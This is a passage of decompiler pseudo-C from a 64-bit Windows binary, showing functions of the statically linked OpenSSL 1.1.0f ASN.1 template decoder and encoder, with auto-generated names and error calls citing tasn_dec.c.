// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400525F0) ----------------------------------------------------
__int64 __fastcall sub_1400525F0(
        __int64 *a1,
        char **a2,
        __int64 a3,
        __int64 a4,
        unsigned int a5,
        int a6,
        char a7,
        __int64 a8)
{
  __int64 v8; // rbx
  int v10; // r13d
  char **v11; // r12
  int v14; // esi
  char *v15; // r15
  __int64 v16; // r9
  __int64 v17; // rbx
  char *v18; // r15
  int v19; // edx
  unsigned int v20; // ecx
  int v21; // r8d
  __int64 v22; // rax
  int v23; // eax
  int v24; // r9d
  int v25; // eax
  int v26; // edx
  int v27; // eax
  int *v28; // rbx
  unsigned int **v29; // rax
  __int64 v30; // rbx
  bool v31; // zf
  __int64 v32; // r12
  unsigned int **v33; // r15
  int v34; // eax
  int v35; // ecx
  int v36; // edx
  int v37; // eax
  char *v38; // r15
  int v39; // r12d
  int v40; // r12d
  int v41; // r13d
  _DWORD *i; // rbx
  int *v43; // rax
  unsigned int **v44; // rax
  __int64 v45; // r13
  _DWORD *v46; // rax
  int v47; // ecx
  char v48; // al
  int v49; // eax
  _DWORD *v50; // rax
  unsigned int **v51; // rax
  const void **v52; // rbx
  char v53[8]; // [rsp+60h] [rbp-39h] BYREF
  char *v54; // [rsp+68h] [rbp-31h] BYREF
  char *v55; // [rsp+70h] [rbp-29h] BYREF
  int *v56; // [rsp+78h] [rbp-21h]
  char *v57; // [rsp+80h] [rbp-19h]
  int v58; // [rsp+E0h] [rbp+47h] BYREF
  const void **v59; // [rsp+E8h] [rbp+4Fh]
  int v60; // [rsp+F0h] [rbp+57h] BYREF
  unsigned int v61; // [rsp+F8h] [rbp+5Fh] BYREF

  v60 = a3;
  v59 = (const void **)a2;
  v8 = *(_QWORD *)(a4 + 24);
  v10 = a3;
  v11 = a2;
  if ( !a1 )
    return 0i64;
  v14 = 0;
  if ( !v8 || (v15 = *(char **)(v8 + 24), (v55 = v15) == 0i64) )
  {
    v15 = 0i64;
    v55 = 0i64;
  }
  switch ( *(_BYTE *)a4 )
  {
    case 0:
      v16 = *(_QWORD *)(a4 + 8);
      if ( !v16 )
        return sub_140051D00(a1, a2, a3, a4, a5, a6, a7, a8);
      if ( a5 != -1 || a7 )
      {
        sub_140024610(13, 120, 170, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 159);
        goto LABEL_117;
      }
      return sub_140052DF0((unsigned int **)a1, a2, a3, v16, 0, a8);
    case 1:
    case 6:
      v54 = *a2;
      v35 = 16;
      v36 = 0;
      if ( a5 != -1 )
      {
        v36 = a6;
        v35 = a5;
      }
      v37 = sub_1400517F0(&v60, 0i64, 0i64, &v58, v53, &v54, a3, v35, v36, a7, a8);
      if ( !v37 )
      {
        sub_140024610(13, 120, 58, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 274);
        goto LABEL_117;
      }
      if ( v37 == -1 )
        return 0xFFFFFFFFi64;
      v38 = v54;
      if ( v8 && (*(_BYTE *)(v8 + 8) & 4) != 0 )
      {
        v39 = *(_DWORD *)v11 - (_DWORD)v54;
        LOBYTE(v61) = 1;
        v40 = v10 + v39;
      }
      else
      {
        v40 = v60;
        LOBYTE(v61) = v58;
      }
      if ( !v53[0] )
      {
        sub_140024610(13, 120, 149, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 286);
        goto LABEL_117;
      }
      if ( !*a1 && !(unsigned int)sub_140050B50(a1, a4) )
      {
        sub_140024610(13, 120, 58, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 291);
        goto LABEL_117;
      }
      if ( v55 && !((unsigned int (__fastcall *)(__int64, __int64 *, __int64))v55)(4i64, a1, a4) )
        goto LABEL_116;
      v41 = 0;
      for ( i = *(_DWORD **)(a4 + 8); v41 < *(_DWORD *)(a4 + 16); i += 8 )
      {
        if ( (*i & 0x300) != 0 )
        {
          v43 = sub_140081E40(a1, (__int64)i, 0);
          v56 = v43;
          if ( v43 )
          {
            v44 = (unsigned int **)sub_140082260(a1, (__int64)v43);
            sub_140051600(v44, v56);
          }
        }
        ++v41;
      }
      v45 = *(_QWORD *)(a4 + 8);
      if ( *(int *)(a4 + 16) <= 0 )
        goto LABEL_93;
      do
      {
        v46 = sub_140081E40(a1, v45, 1);
        v30 = (__int64)v46;
        if ( !v46 )
          goto LABEL_117;
        v56 = (int *)sub_140082260(a1, (__int64)v46);
        if ( !v40 )
          break;
        v47 = (int)v38;
        v57 = v38;
        if ( v40 >= 2 && !*v38 && !v38[1] )
        {
          v38 += 2;
          if ( !(_BYTE)v58 )
          {
            sub_140024610(13, 120, 159, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 325);
            goto LABEL_117;
          }
          v40 += v47 - (_DWORD)v38;
          goto LABEL_98;
        }
        if ( v14 == *(_DWORD *)(a4 + 16) - 1 )
          v48 = 0;
        else
          v48 = *(_BYTE *)v30 & 1;
        v49 = sub_140052DF0((unsigned int **)v56, &v54, v40, v30, v48, a8);
        if ( !v49 )
          goto LABEL_114;
        v38 = v54;
        if ( v49 == -1 )
          sub_140051600((unsigned int **)v56, (int *)v30);
        else
          v40 += (_DWORD)v57 - (_DWORD)v54;
        ++v14;
        v45 += 32i64;
      }
      while ( v14 < *(_DWORD *)(a4 + 16) );
LABEL_93:
      if ( (_BYTE)v58 )
      {
        if ( v40 < 2 || *v38 || v38[1] )
        {
          sub_140024610(13, 120, 137, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 364);
          goto LABEL_117;
        }
        v38 += 2;
      }
LABEL_98:
      if ( !(_BYTE)v61 && v40 )
      {
        sub_140024610(13, 120, 148, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 369);
        goto LABEL_117;
      }
      for ( ; v14 < *(_DWORD *)(a4 + 16); ++v14 )
      {
        v50 = sub_140081E40(a1, v45, 1);
        v30 = (__int64)v50;
        if ( !v50 )
          goto LABEL_117;
        if ( (*(_BYTE *)v50 & 1) == 0 )
        {
          sub_140024610(13, 120, 121, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 389);
          goto LABEL_114;
        }
        v51 = (unsigned int **)sub_140082260(a1, (__int64)v50);
        sub_140051600(v51, (int *)v30);
        v45 += 32i64;
      }
      v52 = v59;
      if ( !(unsigned int)sub_140082180(a1, *v59, (int)v38 - *(_DWORD *)v59, a4)
        || v55 && !((unsigned int (__fastcall *)(__int64, __int64 *, __int64))v55)(5i64, a1, a4) )
      {
        goto LABEL_116;
      }
      *v52 = v38;
      return 1i64;
    case 2:
      if ( v15 && !((unsigned int (__fastcall *)(__int64, __int64 *, __int64))v15)(4i64, a1, a4) )
        goto LABEL_116;
      if ( *a1 )
      {
        v27 = sub_140082250(a1, a4);
        if ( v27 >= 0 && v27 < *(_DWORD *)(a4 + 16) )
        {
          v28 = (int *)(*(_QWORD *)(a4 + 8) + 32i64 * v27);
          v29 = (unsigned int **)sub_140082260(a1, (__int64)v28);
          sub_140051600(v29, v28);
          sub_140082270(a1, -1, a4);
        }
      }
      else if ( !(unsigned int)sub_140050B50(a1, a4) )
      {
        sub_140024610(13, 120, 58, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 214);
        goto LABEL_117;
      }
      v30 = *(_QWORD *)(a4 + 8);
      v54 = *v11;
      v31 = *(_DWORD *)(a4 + 16) == 0;
      if ( *(int *)(a4 + 16) <= 0 )
        goto LABEL_46;
      v32 = a8;
      while ( 1 )
      {
        v33 = (unsigned int **)sub_140082260(a1, v30);
        v34 = sub_140052DF0(v33, &v54, v10, v30, 1, v32);
        if ( v34 != -1 )
          break;
        ++v14;
        v30 += 32i64;
        if ( v14 >= *(_DWORD *)(a4 + 16) )
          goto LABEL_45;
      }
      if ( v34 <= 0 )
      {
        sub_140051600(v33, (int *)v30);
        sub_140024610(13, 120, 58, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 237);
LABEL_114:
        if ( v30 )
        {
          sub_140023A40(4, "Field=", *(_QWORD *)(v30 + 16), ", Type=", *(_QWORD *)(a4 + 40));
          return 0i64;
        }
        goto LABEL_117;
      }
LABEL_45:
      v11 = (char **)v59;
      v15 = v55;
      v31 = v14 == *(_DWORD *)(a4 + 16);
LABEL_46:
      if ( v31 )
      {
        if ( a7 )
        {
          sub_140051230((unsigned int **)a1, a4);
          return 0xFFFFFFFFi64;
        }
        sub_140024610(13, 120, 143, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 249);
        goto LABEL_117;
      }
      sub_140082270(a1, v14, a4);
      if ( v15 && !((unsigned int (__fastcall *)(__int64, __int64 *, __int64))v15)(5i64, a1, a4) )
      {
LABEL_116:
        sub_140024610(13, 120, 100, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 405);
        goto LABEL_117;
      }
      *v11 = v54;
      return 1i64;
    case 4:
      return (*(__int64 (__fastcall **)(__int64 *, char **, __int64, __int64, unsigned int, int, char, __int64))(v8 + 32))(
               a1,
               a2,
               a3,
               a4,
               a5,
               a6,
               a7,
               a8);
    case 5:
      v17 = a8;
      v18 = *a2;
      v55 = *a2;
      if ( a8 && *(_BYTE *)a8 )
      {
        v19 = *(_DWORD *)(a8 + 16);
        v20 = *(_DWORD *)(a8 + 12);
        v21 = *(_DWORD *)(a8 + 4);
        LODWORD(v54) = *(_DWORD *)(a8 + 8);
        v22 = *(int *)(a8 + 20);
        v58 = v19;
        v55 = &v18[v22];
        v61 = v20;
      }
      else
      {
        v23 = sub_140047780(&v55, (int *)&v54, (int *)&v61, &v58, a3);
        v19 = v58;
        LOBYTE(v21) = v23;
        v20 = v61;
        if ( v17 )
        {
          v24 = (int)v54;
          *(_DWORD *)(v17 + 4) = v23;
          v25 = (_DWORD)v55 - (_DWORD)v18;
          *(_DWORD *)(v17 + 8) = v24;
          *(_DWORD *)(v17 + 16) = v19;
          *(_DWORD *)(v17 + 12) = v20;
          *(_DWORD *)(v17 + 20) = v25;
          *(_BYTE *)v17 = 1;
          if ( (v21 & 0x81) == 0 && v24 + v25 > v10 )
          {
            sub_140024610(13, 104, 155, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 1092);
            goto LABEL_22;
          }
        }
      }
      if ( (v21 & 0x80u) != 0 )
      {
        sub_140024610(13, 104, 102, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 1100);
        if ( !v17 )
        {
LABEL_23:
          sub_140024610(13, 120, 58, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 174);
          goto LABEL_117;
        }
LABEL_22:
        *(_BYTE *)v17 = 0;
        goto LABEL_23;
      }
      if ( (_BYTE)v19 )
      {
        if ( !a7 )
        {
          sub_140024610(13, 120, 139, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 183);
          goto LABEL_117;
        }
        return 0xFFFFFFFFi64;
      }
      if ( v20 > 0x1E )
        v26 = 0;
      else
        v26 = dword_1400F83F0[v20];
      if ( (v26 & *(_DWORD *)(a4 + 4)) != 0 )
        return sub_140051D00(a1, v11, v10, a4, v20, 0, 0, v17);
      if ( a7 )
        return 0xFFFFFFFFi64;
      sub_140024610(13, 120, 140, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 191);
LABEL_117:
      sub_140023A40(2, "Type=", *(_QWORD *)(a4 + 40));
      return 0i64;
    default:
      return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1400F83F0: using guessed type int dword_1400F83F0[32];
// 1400525F0: using guessed type char var_70[8];

//----- (0000000140052DF0) ----------------------------------------------------
__int64 __fastcall sub_140052DF0(unsigned int **a1, _BYTE **a2, int a3, __int64 a4, char a5, __int64 a6)
{
  unsigned int v10; // ecx
  __int64 v11; // r14
  int v12; // eax
  int v13; // edi
  int v14; // r8d
  unsigned int *v15; // r9
  int v16; // ebx
  _BYTE *v17; // rax
  int v18; // ebx
  int v19; // [rsp+20h] [rbp-68h]
  char v20[4]; // [rsp+60h] [rbp-28h] BYREF
  int v21; // [rsp+64h] [rbp-24h] BYREF
  _BYTE *v22[4]; // [rsp+68h] [rbp-20h] BYREF
  char v23; // [rsp+90h] [rbp+8h] BYREF

  if ( !a1 )
    return 0i64;
  v10 = *(_DWORD *)a4;
  v22[0] = *a2;
  if ( (v10 & 0x10) == 0 )
    return sub_140052FC0(a1, a2, a3, (unsigned int *)a4, a5, a6);
  v11 = a6;
  v12 = sub_1400517F0(&v21, 0i64, 0i64, v20, &v23, v22, a3, *(_DWORD *)(a4 + 4), (unsigned __int8)v10 & 0xC0, a5, a6);
  v13 = (int)v22[0];
  if ( !v12 )
  {
    v19 = 448;
LABEL_13:
    v14 = 58;
    goto LABEL_10;
  }
  if ( v12 == -1 )
    return 0xFFFFFFFFi64;
  if ( !v23 )
  {
    v19 = 454;
    v14 = 120;
LABEL_10:
    sub_140024610(13, 132, v14, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", v19);
    return 0i64;
  }
  v15 = (unsigned int *)a4;
  v16 = v21;
  if ( !(unsigned int)sub_140052FC0(a1, v22, v21, v15, 0, v11) )
  {
    v19 = 460;
    goto LABEL_13;
  }
  v17 = v22[0];
  v18 = v13 - LODWORD(v22[0]) + v16;
  if ( v20[0] )
  {
    if ( v18 < 2 || *v22[0] || v22[0][1] )
    {
      v19 = 468;
      v14 = 137;
      goto LABEL_10;
    }
    v17 = v22[0] + 2;
  }
  else if ( v18 )
  {
    v19 = 477;
    v14 = 119;
    goto LABEL_10;
  }
  *a2 = v17;
  return 1i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140052DF0: using guessed type char var_28[4];

//----- (0000000140052FC0) ----------------------------------------------------
__int64 __fastcall sub_140052FC0(unsigned int **a1, _BYTE **a2, int a3, unsigned int *a4, char a5, __int64 a6)
{
  __int64 v11; // rdx
  int v12; // edi
  __int64 v13; // rax
  __int64 v14; // rcx
  unsigned int **v15; // r14
  int v16; // ecx
  __int64 v17; // r12
  int v18; // eax
  unsigned int *v19; // rbx
  __int64 v20; // rax
  int v21; // edi
  int v22; // ebx
  int v23; // eax
  _BYTE *v24; // rbx
  __int64 v25; // rax
  __int64 v26; // rax
  int v27; // eax
  int v28; // eax
  int v29; // eax
  int v30; // [rsp+20h] [rbp-49h]
  _BYTE *v31; // [rsp+60h] [rbp-9h] BYREF
  unsigned int *v32; // [rsp+68h] [rbp-1h] BYREF
  __int64 v33; // [rsp+70h] [rbp+7h] BYREF
  char v34; // [rsp+C0h] [rbp+57h] BYREF
  int v35; // [rsp+D0h] [rbp+67h] BYREF

  v35 = a3;
  if ( !a1 )
    return 0i64;
  v11 = *a4;
  v12 = *a4 & 0xC0;
  v31 = *a2;
  v13 = v33;
  v14 = v11 & 0x1000;
  if ( (v11 & 0x1000) != 0 )
    v13 = (__int64)a1;
  v15 = (unsigned int **)&v33;
  v33 = v13;
  if ( (v11 & 0x1000) == 0 )
    v15 = a1;
  if ( (v11 & 6) != 0 )
  {
    if ( (v11 & 8) != 0 )
    {
      v16 = a4[1];
    }
    else
    {
      v12 = 0;
      v16 = (unsigned __int64)(v11 & 2 | 0x20) >> 1;
    }
    v17 = a6;
    v18 = sub_1400517F0(&v35, 0i64, 0i64, &v34, 0i64, &v31, a3, v16, v12, a5, a6);
    if ( !v18 )
    {
      sub_140024610(13, 131, 58, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 536);
      return 0i64;
    }
    if ( v18 != -1 )
    {
      v19 = *v15;
      if ( *v15 )
      {
        if ( (int)sub_1400296E0(*v15) > 0 )
        {
          do
          {
            v32 = (unsigned int *)sub_1400296F0((int *)v19);
            v20 = (*((__int64 (**)(void))a4 + 3))();
            sub_140051230(&v32, v20);
          }
          while ( (int)sub_1400296E0(v19) > 0 );
        }
      }
      else
      {
        *v15 = (unsigned int *)sub_1400296C0();
      }
      if ( !*v15 )
      {
        sub_140024610(13, 131, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 555);
        return 0i64;
      }
      v21 = v35;
      if ( v35 > 0 )
      {
        while ( 1 )
        {
          v22 = (int)v31;
          if ( v21 >= 2 && !*v31 && !v31[1] )
            break;
          v32 = 0i64;
          v23 = (*((__int64 (**)(void))a4 + 3))();
          if ( !(unsigned int)sub_1400525F0((unsigned int)&v32, (unsigned int)&v31, v21, v23, -1, 0, 0, v17) )
          {
            sub_140024610(13, 131, 58, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 578);
            v26 = (*((__int64 (**)(void))a4 + 3))();
            sub_140051250(v32, v26);
            return 0i64;
          }
          v21 += v22 - (_DWORD)v31;
          if ( !(unsigned int)sub_1400297C0((int *)*v15, (__int64)v32) )
          {
            sub_140024610(13, 131, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 585);
            v25 = (*((__int64 (**)(void))a4 + 3))();
            sub_140051250(v32, v25);
            return 0i64;
          }
          if ( v21 <= 0 )
            goto LABEL_27;
        }
        v24 = v31 + 2;
        v31 += 2;
        if ( v34 )
          goto LABEL_43;
        sub_140024610(13, 131, 159, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 567);
        return 0i64;
      }
LABEL_27:
      if ( v34 )
      {
        sub_140024610(13, 131, 137, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 591);
        return 0i64;
      }
      goto LABEL_42;
    }
    return 0xFFFFFFFFi64;
  }
  if ( (v11 & 8) != 0 )
  {
    v27 = (*((__int64 (__fastcall **)(__int64, __int64, unsigned int **))a4 + 3))(v14, v11, a1);
    v28 = sub_1400525F0((_DWORD)v15, (unsigned int)&v31, a3, v27, a4[1], v12, a5, a6);
    if ( !v28 )
    {
      v30 = 600;
LABEL_38:
      sub_140024610(13, 131, 58, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", v30);
      return 0i64;
    }
  }
  else
  {
    v29 = (*((__int64 (__fastcall **)(__int64, __int64, unsigned int **))a4 + 3))(v14, v11, a1);
    v28 = sub_1400525F0((_DWORD)v15, (unsigned int)&v31, a3, v29, -1, 0, a5, a6);
    if ( !v28 )
    {
      v30 = 609;
      goto LABEL_38;
    }
  }
  if ( v28 == -1 )
    return 0xFFFFFFFFi64;
LABEL_42:
  v24 = v31;
LABEL_43:
  *a2 = v24;
  return 1i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1400525F0: using guessed type __int64 __fastcall sub_1400525F0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, char, __int64);

//----- (0000000140053350) ----------------------------------------------------
__int64 __fastcall sub_140053350(unsigned int **a1, unsigned __int8 **a2, __int64 a3, int a4, int a5)
{
  __int64 v5; // r10
  int v6; // r13d
  unsigned int **v7; // rsi
  int v9; // edx
  int v10; // ebx
  unsigned int (__fastcall *v12)(__int64, unsigned int **, __int64); // rbp
  __int64 result; // rax
  int v14; // r12d
  int *v15; // r8
  unsigned __int8 **v16; // rdx
  int v17; // eax
  __int64 v18; // rbx
  __int64 v19; // rax
  int v20; // eax
  int v21; // edx
  int v22; // ebx
  __int64 v23; // r14
  int *v24; // rax
  int *v25; // r12
  unsigned int **v26; // rax
  signed int v27; // eax
  int v28; // ebx
  __int64 v29; // r14
  int *v30; // rax
  int *v31; // rbx
  unsigned int **v32; // rax
  int v33; // [rsp+20h] [rbp-58h]
  int v34; // [rsp+30h] [rbp-48h]
  unsigned int v35; // [rsp+30h] [rbp-48h]
  int v36; // [rsp+34h] [rbp-44h]
  unsigned int v37; // [rsp+90h] [rbp+18h] BYREF
  int v38; // [rsp+98h] [rbp+20h]

  v38 = a4;
  v5 = *(_QWORD *)(a3 + 24);
  v6 = 0;
  v7 = a1;
  v9 = 1;
  v36 = 1;
  v10 = a4;
  v12 = 0i64;
  if ( *(_BYTE *)a3 && !*a1 )
    return 0i64;
  if ( v5 && *(_QWORD *)(v5 + 24) )
    v12 = *(unsigned int (__fastcall **)(__int64, unsigned int **, __int64))(v5 + 24);
  v14 = a5;
  v34 = a5;
  switch ( *(_BYTE *)a3 )
  {
    case 0:
      v15 = *(int **)(a3 + 8);
      v33 = a5;
      v16 = a2;
      if ( v15 )
        return sub_140053D50(a1, v16, v15, a4, v33);
      return sub_1400538D0((unsigned __int8 ***)a1, a2, a3, a4, a5);
    case 1:
      goto LABEL_24;
    case 2:
      if ( v12 && !v12(6i64, a1, a3) )
        return 0i64;
      v17 = sub_140082250(v7, a3);
      if ( v17 < 0 || v17 >= *(_DWORD *)(a3 + 16) )
      {
        if ( v12 )
          v12(7i64, v7, a3);
        return 0i64;
      }
      v18 = *(_QWORD *)(a3 + 8) + 32i64 * v17;
      v19 = sub_140082260(v7, v18);
      a4 = -1;
      v33 = v14;
      v15 = (int *)v18;
      a1 = (unsigned int **)v19;
      v16 = a2;
      return sub_140053D50(a1, v16, v15, a4, v33);
    case 4:
      return (*(__int64 (__fastcall **)(unsigned int **, unsigned __int8 **, __int64))(v5 + 40))(a1, a2, a3);
    case 5:
      return sub_1400538D0((unsigned __int8 ***)a1, a2, a3, -1, a5);
    case 6:
      if ( (a5 & 0x800) != 0 )
        v9 = 2;
      v36 = v9;
LABEL_24:
      v20 = sub_1400820E0(&v37, (void **)a2, a1, a3);
      if ( v20 < 0 )
        return 0i64;
      if ( v20 > 0 )
        return v37;
      v21 = 0;
      v37 = 0;
      if ( v10 == -1 )
      {
        v14 &= 0xFFFFFF3F;
        v38 = 16;
        v34 = v14;
      }
      if ( v12 )
      {
        if ( !v12(6i64, v7, a3) )
          return 0i64;
        v21 = v37;
      }
      v22 = 0;
      v23 = *(_QWORD *)(a3 + 8);
      if ( *(int *)(a3 + 16) <= 0 )
        goto LABEL_38;
      break;
    default:
      return 0i64;
  }
  do
  {
    v24 = sub_140081E40(v7, v23, 1);
    v25 = v24;
    if ( !v24 )
      return 0i64;
    v26 = (unsigned int **)sub_140082260(v7, (__int64)v24);
    v27 = sub_140053D50(v26, 0i64, v25, -1, v34);
    if ( v27 == -1 || v27 > (int)(0x7FFFFFFF - v37) )
      return 0xFFFFFFFFi64;
    v21 = v27 + v37;
    v23 += 32i64;
    ++v22;
    v37 += v27;
  }
  while ( v22 < *(_DWORD *)(a3 + 16) );
  v14 = v34;
LABEL_38:
  v28 = v38;
  result = sub_140047960(v36, v21, v38);
  v35 = result;
  if ( a2 && (_DWORD)result != -1 )
  {
    sub_1400479D0(a2, v36, v37, v28, v14);
    v29 = *(_QWORD *)(a3 + 8);
    if ( *(int *)(a3 + 16) > 0 )
    {
      do
      {
        v30 = sub_140081E40(v7, v29, 1);
        v31 = v30;
        if ( !v30 )
          return 0i64;
        v32 = (unsigned int **)sub_140082260(v7, (__int64)v30);
        sub_140053D50(v32, a2, v31, -1, v14);
        v29 += 32i64;
      }
      while ( ++v6 < *(_DWORD *)(a3 + 16) );
    }
    if ( v36 == 2 )
      sub_1400479B0((_WORD **)a2);
    if ( v12 && !v12(7i64, v7, a3) )
      return 0i64;
    return v35;
  }
  return result;
}

//----- (00000001400536F0) ----------------------------------------------------
__int64 __fastcall sub_1400536F0(unsigned int *a1, unsigned __int8 **a2, __int64 a3)
{
  return sub_1400539D0(a1, a2, a3, 0);
}

//----- (0000000140053710) ----------------------------------------------------
__int64 __fastcall sub_140053710(unsigned __int8 ***a1, unsigned __int8 *a2, int *a3, __int64 a4)
{
  __int64 v4; // rax
  unsigned __int8 ***v6; // r10
  __int64 (*v7)(void); // rax
  int v9; // ecx
  unsigned __int8 **v10; // rax
  char *v11; // rcx
  int v12; // ebx
  __int64 *v13; // rdx
  unsigned __int8 **v14; // rdx
  unsigned __int8 **v15; // rax
  unsigned __int8 *v16; // [rsp+38h] [rbp+10h] BYREF
  char v17; // [rsp+48h] [rbp+20h] BYREF

  v16 = a2;
  v4 = *(_QWORD *)(a4 + 24);
  v6 = a1;
  if ( v4 )
  {
    v7 = *(__int64 (**)(void))(v4 + 48);
    if ( v7 )
      return v7();
  }
  if ( (*(_BYTE *)a4 || *(_DWORD *)(a4 + 4) != 1) && !*a1 )
    return 0xFFFFFFFFi64;
  if ( *(_BYTE *)a4 == 5 )
  {
    v9 = *((_DWORD *)*a1 + 1);
    *a3 = v9;
  }
  else if ( *(_DWORD *)(a4 + 4) == -4 )
  {
    v10 = *a1;
    v9 = *(_DWORD *)*a1;
    v6 = (unsigned __int8 ***)(v10 + 1);
    *a3 = v9;
  }
  else
  {
    v9 = *a3;
  }
  switch ( v9 )
  {
    case 1:
      if ( *(_DWORD *)v6 == -1 )
        return 0xFFFFFFFFi64;
      if ( *(_DWORD *)(a4 + 4) == -4 )
        goto LABEL_22;
      if ( !*(_DWORD *)v6 )
      {
        if ( !*(_DWORD *)(a4 + 32) )
          return 0xFFFFFFFFi64;
LABEL_22:
        v17 = *(_DWORD *)v6;
        v11 = &v17;
        v12 = 1;
        goto LABEL_35;
      }
      if ( *(int *)(a4 + 32) <= 0 )
        goto LABEL_22;
      return 0xFFFFFFFFi64;
    case 2:
    case 10:
      v14 = &v16;
      if ( !a2 )
        v14 = 0i64;
      return sub_14007E280(*v6, v14);
    case 3:
      v13 = (__int64 *)&v16;
      if ( !a2 )
        v13 = 0i64;
      return sub_140082A20((int *)*v6, (_BYTE **)v13);
    case 5:
      v11 = 0i64;
      v12 = 0;
      goto LABEL_35;
    case 6:
      v11 = (char *)(*v6)[3];
      v12 = *((_DWORD *)*v6 + 5);
      goto LABEL_35;
    default:
      v15 = *v6;
      if ( *(_DWORD *)(a4 + 32) == 2048 && ((_BYTE)v15[2] & 0x10) != 0 )
      {
        if ( a2 )
        {
          v15[1] = a2;
          *(_DWORD *)v15 = 0;
        }
        return 4294967294i64;
      }
      else
      {
        v11 = (char *)v15[1];
        v12 = *(_DWORD *)v15;
LABEL_35:
        if ( a2 )
        {
          if ( v12 )
            memmove(a2, v11, v12);
        }
        return (unsigned int)v12;
      }
  }
}

//----- (00000001400538D0) ----------------------------------------------------
__int64 __fastcall sub_1400538D0(unsigned __int8 ***a1, unsigned __int8 **a2, __int64 a3, int a4, char a5)
{
  int v9; // r14d
  int v10; // ebx
  BOOL v11; // ebp
  int v13; // [rsp+70h] [rbp+18h] BYREF

  v13 = *(_DWORD *)(a3 + 4);
  v9 = 0;
  v10 = sub_140053710(a1, 0i64, &v13, a3);
  v11 = (unsigned int)(v13 - 16) > 1 && v13 != -3;
  if ( v10 == -1 )
    return 0i64;
  if ( v10 == -2 )
  {
    v10 = 0;
    v9 = 2;
  }
  if ( a4 == -1 )
    a4 = v13;
  if ( a2 )
  {
    if ( v11 )
      sub_1400479D0(a2, v9, v10, a4, a5);
    sub_140053710(a1, *a2, &v13, a3);
    if ( v9 )
      sub_1400479B0((_WORD **)a2);
    else
      *a2 += v10;
  }
  if ( v11 )
    return sub_140047960(v9, v10, a4);
  else
    return (unsigned int)v10;
}

//----- (00000001400539D0) ----------------------------------------------------
__int64 __fastcall sub_1400539D0(unsigned int *a1, unsigned __int8 **a2, __int64 a3, int a4)
{
  __int64 result; // rax
  unsigned int v8; // edi
  unsigned __int8 *v9; // rax
  unsigned __int8 *v10; // r14
  unsigned int *v11; // [rsp+50h] [rbp+8h] BYREF
  unsigned __int8 *v12; // [rsp+58h] [rbp+10h] BYREF

  v11 = a1;
  if ( !a2 || *a2 )
    return sub_140053350(&v11, a2, a3, -1, a4);
  LODWORD(result) = sub_140053350(&v11, 0i64, a3, -1, a4);
  v8 = result;
  if ( (int)result <= 0 )
    return (unsigned int)result;
  v9 = (unsigned __int8 *)sub_14001D8E0((int)result);
  v10 = v9;
  if ( !v9 )
    return 0xFFFFFFFFi64;
  v12 = v9;
  sub_140053350(&v11, &v12, a3, -1, a4);
  result = v8;
  *a2 = v10;
  return result;
}

//----- (0000000140053AB0) ----------------------------------------------------
__int64 __fastcall sub_140053AB0(unsigned int *a1, void **a2, int a3, int a4, int a5, int a6)
{
  int v6; // ebx
  size_t v7; // rsi
  int v11; // eax
  __int64 result; // rax
  char *v13; // r14
  void *v14; // rax
  void *v15; // r13
  int v16; // r15d
  char *v17; // rsi
  int v18; // eax
  int v19; // ebp
  const void **v20; // rsi
  __int64 v21; // rax
  __int64 *v22; // rsi
  void *v23; // [rsp+30h] [rbp-48h] BYREF
  __int64 v24; // [rsp+38h] [rbp-40h] BYREF
  void *v25; // [rsp+40h] [rbp-38h]

  v6 = 0;
  v7 = a3;
  v23 = 0i64;
  if ( a5 && (int)sub_1400296E0(a1) >= 2 )
  {
    v11 = sub_1400296E0(a1);
    result = (__int64)sub_14001D8E0(24i64 * v11);
    v13 = (char *)result;
    if ( result )
    {
      v14 = sub_14001D8E0(v7);
      v25 = v14;
      v15 = v14;
      if ( v14 )
      {
        v16 = 0;
        v23 = v14;
        if ( (int)sub_1400296E0(a1) > 0 )
        {
          v17 = v13 + 16;
          do
          {
            v24 = sub_140029880((__int64)a1, v16);
            *((_QWORD *)v17 - 2) = v23;
